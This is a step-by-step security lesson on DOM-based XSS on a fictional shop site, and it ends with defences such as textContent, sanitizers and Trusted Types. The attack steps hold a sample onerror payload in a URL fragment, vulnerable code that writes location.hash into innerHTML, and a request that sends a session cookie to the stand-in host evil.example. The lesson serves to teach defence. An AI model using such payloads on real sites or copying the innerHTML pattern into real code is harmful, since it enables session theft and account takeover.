# DOM XSS

`lesson` C3 · `section` C · `wave` 3 · `format` 1

## Passport

- `cwe` 79
- `owasp` A03:2021
- `severity` medium
- `impact` Someone else's script inside the site's page: actions in the victim's name, theft of the session cookie
- `defence` A safe sink (textContent) and Trusted Types
- `class` Injection into a web page inside the browser

## Sources

- [OWASP: DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [MITRE CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP Top 10:2021, A03 Injection](https://owasp.org/Top10/2021/A03_2021-Injection/)
- [MDN: URI fragment](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Fragment)
- [MDN: Element.innerHTML, Security considerations](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)
- [MDN: Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
- [MDN: CSP, require-trusted-types-for](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for)
- [W3C: Trusted Types](https://www.w3.org/TR/trusted-types/)

## Participants

- `attacker` **Attacker** — 203.0.113.66 · `term:attacker`
- `browser` **Victim's browser** — 192.0.2.24 · `term:victim`
- `server` **Shop server** — shop.example · `term:web-server`

## Zones

- `internet` Internet: `attacker`
- `home` Home: `browser`
- `site` Site shop.example: `server` · `term:trust-boundary`

## Steps

### `link` A link with a tail after #

`attacker → browser` · `attack` · `icon:mail`
Message: link to a promo · Result: delivered

```text
https://shop.example/promo#⟦<img src=x onerror=steal()>⟧
```

#### Simple

The victim gets a link to the shop's **real** promo page. At the end of the address, after the
`#` sign, a piece of markup with a program is hidden.

#### Step by step

The promo page greets the visitor by a name taken from the address: `promo#Anna` shows
“Hi, Anna!”. Instead of a name, the attacker puts an image tag after `#`, with an `onerror`
handler that calls his function.

#### Deeper

`steal()` is a made-up name for the attacker's code. In a real link the special characters are
encoded, so the catch is not visible at a glance. The part of an address after `#` is called the
fragment. It usually points to a place in the page, but the page's scripts can read it too.

### `load` The browser opens the page

`browser → server` · `legit`
Message: GET /promo · Result: fragment not sent

```http
GET /promo
Host: shop.example
```

#### Simple

The victim clicks the link. The browser asks the shop for the promo page but **does not send the
tail after `#` to the server**. The server does not even see the attack.

#### Step by step

The request contains only the path `/promo`. The browser keeps the fragment to itself and will
handle it once the page has loaded.

#### Deeper

According to MDN, the fragment is not sent to the server with the request: the client processes
it. That is why DOM XSS does not show up in server logs and a filter on the server cannot catch
it. The bug lives entirely in the page's JavaScript.

### `page` An ordinary page with a dangerous line of code

`server → browser` · `legit`
Message: promo page · Result: page script loaded

```js
const name = decodeURIComponent(location.hash.slice(1));
banner.innerHTML = 'Hi, ' + ⟦name⟧ + '!';
```

#### Simple

The server sends an ordinary page. It has a shop script that takes the name from the address and
**puts it into the page as markup**.

#### Step by step

`location.hash` is a **source**: data that anyone can set comes into the program from here.
`innerHTML` is a **sink**: the browser parses whatever is written into it as HTML. The bug is that
data flows from one to the other without processing.

#### Deeper

The script needs `decodeURIComponent` because the browser does not decode the fragment back when
reading it. The server itself pasted nothing in: the response is the same for everyone. MITRE
calls this kind DOM-based (type 0): client-side code does the injection by changing the DOM, the
page tree in the browser.

### `sink` The page script inserts markup

`browser → browser` · `attack` · `without-defence`
Message: innerHTML = fragment · Result: onerror handler ran

```html
<div id="banner">Hi, ⟦<img src=x onerror=steal()>⟧!</div>
```

#### Simple

The shop's script obediently puts the “name” into the banner. The browser sees an image tag,
fails to load the image and **runs the error handler**, which is the attacker's code.

#### Step by step

There is no image at address `x`, so the browser calls `onerror`. The code runs inside the
shop.example page and gets all of its rights in that tab.

#### Deeper

That is why the attacker did not use `<script>`: according to MDN, a `<script>` tag inserted
through `innerHTML` does not run. But this is no defence: event handlers on other tags remain.
Other dangerous sinks are `document.write()`, `eval()` and `setTimeout` with a string.

### `steal` The cookie goes to the attacker

`browser → attacker` · `attack` · `without-defence`
Message: session cookie · Result: stolen

```http
GET /c?d=⟦session=7f3a9c⟧
Host: evil.example
```

#### Simple

The attacker's code reads the victim's **pass** to the shop and sends it to his server. From
here on it is the same as any XSS.

#### Step by step

The code reads `document.cookie` and makes a request to the attacker's server with the value
written into the address.

#### Deeper

`HttpOnly` on the session cookie would stop the code from reading it, but the code could still act
in the victim's name right in her tab. The page script is what needs fixing, not the cookie.

### `text` The script writes text, not markup

`browser → browser` · `attack` · `with-defence` · `stopped`
Message: textContent = fragment · Result: the tag is shown as letters, the attack failed

```js
banner.textContent = 'Hi, ' + name + '!';
```

#### Simple

The shop fixed one line: now the name goes in **as text**. The victim sees a strange greeting
with angle brackets, but nothing runs. This is where the attack stops.

#### Step by step

`textContent` is a safe sink: the browser puts the string into the page as letters and does not
parse it as HTML. No `<img>` tag appears, and no handler runs.

#### Deeper

OWASP names choosing the right sink as the main way to fix DOM XSS: for text, `textContent`
instead of `innerHTML`. If HTML is really needed, it goes through a sanitizer. The other extreme
is dangerous too: `eval()` with user data cannot be fixed by any processing.

### `tt` A Trusted Types policy

`server → browser` · `attack` · `with-defence` · `stopped`
Message: page with a policy · Result: string in innerHTML rejected

```http
Content-Security-Policy: ⟦require-trusted-types-for 'script'⟧
```

#### Simple

This is a separate scenario: suppose a dangerous line of code was missed somewhere. The second
layer is **Trusted Types**: the site tells the browser “let only checked data into dangerous
sinks”. A plain string in `innerHTML` causes an error, and the attacker's markup is not inserted.

#### Step by step

The server sends the page with a Content Security Policy header containing the
`require-trusted-types-for` rule. When a script writes a plain string into `innerHTML`, the
browser throws a `TypeError`.

#### Deeper

To write HTML, the site sets up a policy: a function that data passes through before reaching
the sink, such as a sanitizer. This way all dangerous spots meet in one place that is easy to
review. The `trusted-types` rule lists the names of allowed policies. Trusted Types are described
in the W3C Trusted Types specification.

## How to defend

- **Safe sinks.** Insert text with `textContent`, or build nodes with `createElement`.
  `innerHTML`, `outerHTML` and `document.write()` are only for HTML you have checked.
- **Do not execute strings.** `eval()`, and `setTimeout` or `setInterval` with a string, turn data
  into code. Do without them.
- **A sanitizer when HTML is needed.** Run markup from the address, messages and other outside
  data through a proven sanitizer before inserting it.
- **Trusted Types.** The header `Content-Security-Policy: require-trusted-types-for 'script'`
  forbids writing plain strings into dangerous sinks, and policies gather the checking in one
  place.
- **Remember that the server does not see the fragment.** Server-side filters and logs do not
  notice DOM XSS: review the page's JavaScript for places where data from the address and other
  places an outsider can set reach sinks.
